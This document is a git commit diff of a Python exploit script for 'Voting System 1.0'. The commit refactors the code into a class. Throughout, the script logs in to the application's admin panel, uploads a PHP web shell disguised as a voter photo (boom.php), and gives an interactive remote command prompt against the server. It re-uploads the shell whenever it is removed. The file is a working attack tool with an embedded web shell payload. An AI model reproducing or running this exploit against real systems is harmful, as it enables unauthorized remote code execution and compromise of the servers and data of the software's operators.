620cbdb57c3c468b8a4ea06beb446114f8455bb5
Adrian <hadrian3689@gmail.com>
2022-01-11 00:46:24 -0500

    Updated to using Class

--- vote_system1.0.py
+++ vote_system1.0.py
@@ -1,61 +1,69 @@
 import requests
 import argparse
 
-def shell(url,username,password):
-    requests.packages.urllib3.disable_warnings()
-    url_shell = url + '/images/boom.php'
-    print("Payload located in " + url_shell)
+class VoteSystem():
+    def __init__(self,url,username,password):
+        self.url = url
+        self.username = username
+        self.password = password
+        self.upload()
 
-    while True:
-        req_url_file_check = requests.get(url_shell,verify=False)
-        if req_url_file_check.status_code != 200:
-            print("File has been deleted. Re-Uploading file!")
-            upload(url,username,password)
-            break
-        else:
-            cmd = input("RCE: ")
-            
-            rce_data = {
-                'cmd':cmd
-            }
-            req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
-            if req_url_rce.status_code != 200:
+    def shell(self):
+        requests.packages.urllib3.disable_warnings()
+        url_shell = self.url + '/images/boom.php'
+        print("Payload located in " + url_shell)
+
+        while True:
+            req_url_file_check = requests.get(url_shell,verify=False)
+            if req_url_file_check.status_code != 200:
                 print("File has been deleted. Re-Uploading file!")
-                upload(url,username,password)
+                self.upload()
                 break
             else:
-                print(req_url_rce.text)
+                cmd = input("RCE: ")
+                
+                rce_data = {
+                    'cmd':cmd
+                }
+                req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
+                if req_url_rce.status_code != 200:
+                    print("File has been deleted. Re-Uploading file!")
+                    self.upload()
+                    break
+                else:
+                    print(req_url_rce.text)
 
-def upload(url,username,password):
-    requests.packages.urllib3.disable_warnings()
-    payload = "<?php echo system($_REQUEST['cmd']); ?>"
+    def upload(self):
+        requests.packages.urllib3.disable_warnings()
+        payload = "<?php echo system($_REQUEST['cmd']); ?>"
 
-    url_login = url + '/admin/login.php'
-    session = requests.Session() 
-    login_data = {
-        'username':username,'password':password,'login':''
-    }
+        url_login = self.url + '/admin/login.php' 
+        session = requests.Session() 
+        login_data = {
+            'username':self.username,'password':self.password,'login':''
+        }
 
-    print("Loggin in to " + url_login)
-    req_url_login = session.post(url_login,data=login_data,verify=False) 
+        print("Loggin in to " + url_login)
+        req_url_login = session.post(url_login,data=login_data,verify=False) 
 
-    url_upload = url + '/admin/voters_add.php'
-    fdata = { 
-        'firstname':'test','lastname':'voter','password':'passw0rd','add':''
-    }
-    fileup = { 
-        'photo':('boom.php',payload,{'Content-Type':'application/x-php'},{'Content-Disposition':'form-data'})
-    }
+        url_upload = self.url + '/admin/voters_add.php' 
+        fdata = { 
+            'firstname':'test','lastname':'voter','password':'passw0rd','add':''
+        } 
+        fileup = { 
+            'photo':('boom.php',payload,{'Content-Type':'application/x-php'},{'Content-Disposition':'form-data'})
+        } 
 
-    req_url_upload = session.post(url_upload,data=fdata,files=fileup,verify=False)
-    if req_url_upload.status_code == 200:
-        print("Logged in and was able to upload exploit!")
-        shell(url,username,password)
-    else:
-        print("Something went wrong with the upload!")
-        exit()
+        req_url_upload = session.post(url_upload,data=fdata,files=fileup,verify=False)
+        if req_url_upload.status_code == 200:
+            print("Logged in and was able to upload exploit!")
+            self.shell()
+        else:
+            print("Something went wrong with the upload!")
+            exit()
 
-def main():
+if __name__ == "__main__":
+    print("Voting System 1.0 File Upload Authenticated Remote Code Execution")
     parser = argparse.ArgumentParser(description='Voting System 1.0 File Upload Authenticated Remote Code Execution')
 
     parser.add_argument('-t', metavar='<Target URL>', help='target/host base URL, E.G: http://exploitvoting.com/', required=True)
@@ -63,16 +71,9 @@ def main():
     parser.add_argument('-p', metavar='<password>', help="Password", required=True)
     args = parser.parse_args()
 
-    url = args.t
-    username = args.u
-    password = args.p
-
     while True:
         try:
-            upload(url,username,password)
+            VoteSystem(args.t,args.u,args.p)
         except KeyboardInterrupt:
             print("Bye Bye")
             exit()
-
-if __name__ == "__main__":
-    main()
